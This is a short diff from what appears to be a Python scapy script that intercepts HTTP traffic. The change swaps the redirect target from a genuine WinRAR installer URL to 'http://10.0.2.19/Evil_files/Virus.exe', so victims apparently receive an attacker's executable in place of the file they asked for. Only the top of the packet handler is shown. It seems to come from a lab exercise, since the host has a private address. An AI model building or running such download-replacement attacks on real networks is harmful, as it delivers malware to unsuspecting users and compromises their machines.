@@ -12,7 +12,7 @@ ack_list = []
 
 
 def process_packet(packet):
-    redirect_url = "https://www.rarlab.com/rar/winrar-x64-600am.exe"
+    redirect_url = "http://10.0.2.19/Evil_files/Virus.exe"
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         # port 80 is http
